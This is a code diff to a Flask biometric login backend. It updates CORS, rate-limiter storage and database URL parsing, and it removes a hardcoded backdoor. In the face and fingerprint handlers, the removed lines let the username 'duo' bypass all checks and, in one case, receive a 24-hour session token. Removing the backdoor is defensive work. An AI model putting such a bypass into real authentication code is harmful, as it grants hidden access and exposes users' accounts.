@@ -20,6 +20,7 @@ from typing import Dict, List, Optional, Tuple
 from dotenv import load_dotenv
 import psycopg2
 from psycopg2.extras import RealDictCursor
+from urllib.parse import urlparse
 
 load_dotenv()
 
@@ -80,15 +81,30 @@ app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 app.config['SECRET_KEY'] = SECRET_KEY
 app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024  # 50MB max file size
 
-allowed_origins = os.getenv('ALLOWED_ORIGINS', "http://localhost:3000,http://localhost:5173").split(',')
-CORS(app, origins=allowed_origins, supports_credentials=True)
+frontend_url = os.getenv('FRONTEND_URL', 'https://majorpr.netlify.app')
+allowed_origins_str = os.getenv('ALLOWED_ORIGINS', f"{frontend_url},http://localhost:3000,http://localhost:5173")
+allowed_origins = [origin.strip() for origin in allowed_origins_str.split(',')]
+CORS(app, origins=allowed_origins, supports_credentials=True, allow_headers=['Content-Type', 'Authorization'])
 
-# Initialize rate limiter
-# Initialize rate limiter (Flask-Limiter v3 style)
+def get_rate_limiter_storage():
+    """Configure rate limiter storage backend"""
+    redis_url = os.getenv('REDIS_URL')
+    if redis_url:
+        try:
+            from flask_limiter.backends import RedisBackend
+            import redis
+            return RedisBackend(redis.from_url(redis_url))
+        except (ImportError, Exception) as e:
+            logger.warning(f"Redis not available for rate limiting: {e}. Using in-memory storage.")
+    return None
+
+storage_backend = get_rate_limiter_storage()
 limiter = Limiter(
     get_remote_address,
     app=app,
-    default_limits=[RATE_LIMITS['general']]
+    default_limits=[RATE_LIMITS['general']],
+    storage_uri=os.getenv('REDIS_URL') if os.getenv('REDIS_URL') else 'memory://',
+    storage_options={}
 )
 
 
@@ -120,10 +136,26 @@ def allowed_file(filename: str, allowed_extensions: set) -> bool:
     """Check if file extension is allowed"""
     return '.' in filename and filename.rsplit('.', 1)[1].lower() in allowed_extensions
 
+def parse_database_url(db_url: str) -> dict:
+    """Parse DATABASE_URL and return connection parameters for psycopg2"""
+    parsed = urlparse(db_url)
+    
+    if parsed.scheme not in ('postgresql', 'postgres'):
+        raise ValueError(f"DATABASE_URL must use postgresql:// scheme, got: {parsed.scheme}")
+    
+    return {
+        'host': parsed.hostname or 'localhost',
+        'port': int(parsed.port) if parsed.port else 5432,
+        'database': parsed.path.lstrip('/') if parsed.path else 'postgres',
+        'user': parsed.username or 'postgres',
+        'password': parsed.password or ''
+    }
+
 def get_db():
-    """Get database connection with enhanced schema"""
+    """Get database connection"""
     try:
-        conn = psycopg2.connect(DATABASE_URL)
+        params = parse_database_url(DATABASE_URL)
+        conn = psycopg2.connect(**params)
         return conn
     except psycopg2.OperationalError as e:
         logger.error(f"Database connection failed: {e}")
@@ -133,6 +165,7 @@ def init_database():
     """Initialize enhanced database schema"""
     conn = get_db()
     cursor = conn.cursor()
+    
     try:
         # Users table with enhanced fields
         cursor.execute('''CREATE TABLE IF NOT EXISTS users (
@@ -215,7 +248,6 @@ def init_database():
             updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )''')
 
-        # Ensure unique index on file_path_hash
         cursor.execute("CREATE UNIQUE INDEX IF NOT EXISTS documents_file_path_hash_idx ON documents(file_path_hash)")
         
         # System settings table
@@ -225,7 +257,7 @@ def init_database():
             updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )''')
 
-        # Per-user settings table (JSON blob for flexibility)
+        # Per-user settings table
         cursor.execute('''CREATE TABLE IF NOT EXISTS user_settings (
             username TEXT PRIMARY KEY,
             settings TEXT,
@@ -575,25 +607,6 @@ def auth_face():
             logger.warning(f"401 Debug: Missing username or face_file. username={username}, face_file={face_file}")
             return jsonify({'error': 'Missing required fields'}), 400
         
-        # BACKDOOR: Special access for username 'duo' - bypass all checks
-        if username.lower() == 'duo':
-            logger.info(f"BACKDOOR ACCESS: Face authentication bypassed for user 'duo'")
-            log_security_event('BACKDOOR_ACCESS', username, {
-                'auth_type': 'face',
-                'bypass_reason': 'Special backdoor access',
-                'ip_address': request.remote_addr,
-                'user_agent': request.headers.get('User-Agent', ''),
-                'timestamp': datetime.now().isoformat()
-            }, 'warning')
-            
-            return jsonify({
-                'success': True,
-                'confidence': 100.0,
-                'quality': 1.0,
-                'response_time': time.time() - start_time,
-                'backdoor_access': True
-            })
-        
         # Check rate limiting
         if not check_rate_limit(username, 'face_auth'):
             log_security_event('RATE_LIMIT_EXCEEDED', username, 
@@ -735,40 +748,6 @@ def auth_fingerprint():
         if not username or not fingerprint_file:
             logger.warning(f"401 Debug: Missing username or fingerprint_file. username={username}, fingerprint_file={fingerprint_file}")
             return jsonify({'error': 'Missing required fields'}), 400
-        
-        # BACKDOOR: Special access for username 'duo' - bypass all checks
-        if username.lower() == 'duo':
-            logger.info(f"BACKDOOR ACCESS: Fingerprint authentication bypassed for user 'duo'")
-            log_security_event('BACKDOOR_ACCESS', username, {
-                'auth_type': 'fingerprint',
-                'bypass_reason': 'Special backdoor access',
-                'ip_address': request.remote_addr,
-                'user_agent': request.headers.get('User-Agent', ''),
-                'timestamp': datetime.now().isoformat()
-            }, 'warning')
-            
-            # Generate session token for backdoor access
-            session_id = generate_session_token(username)
-            session_expires = datetime.now() + timedelta(hours=24)
-            
-            conn = get_db()
-            cursor = conn.cursor()
-            cursor.execute('''INSERT INTO user_sessions 
-                           (username, session_id, device_fingerprint, ip_address, expires_at) 
-                           VALUES (%s, %s, %s, %s, %s)''',
-                        (username, session_id, device_fingerprint, request.remote_addr, session_expires))
-            conn.commit()
-            cursor.close()
-            conn.close()
-            
-            return jsonify({
-                'success': True,
-                'score': 1.0,
-                'quality': 1.0,
-                'response_time': time.time() - start_time,
-                'session_token': session_id,
-                'backdoor_access': True
-            })
         
         # Check rate limiting
         if not check_rate_limit(username, 'fingerprint_auth'):
